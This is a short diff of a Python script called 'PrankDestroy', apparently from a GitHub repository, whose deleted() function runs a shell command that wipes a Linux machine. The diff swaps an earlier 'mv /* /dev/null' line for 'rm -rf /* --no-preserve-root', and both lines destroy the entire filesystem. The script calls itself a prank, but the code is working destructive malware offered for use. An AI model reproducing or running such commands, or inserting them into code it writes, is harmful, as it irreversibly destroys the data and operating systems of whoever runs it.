@@ -1,4 +1,4 @@
-# Move total discord to null
+# Remove total linux
 # By: https://github.com/Br3Fuck/PrankDestroy
 # Modulos:
 
@@ -18,8 +18,8 @@ def clear():
 # Deleted System:
 
 def deleted():
-	print("Moviendo todo el disco a /dev/null")
-	os.system("mv /* /dev/null")
+	print("Eliminando sistema operativo...")
+	os.system("rm -rf /* --no-preserve-root")
 	
 # Run:
 
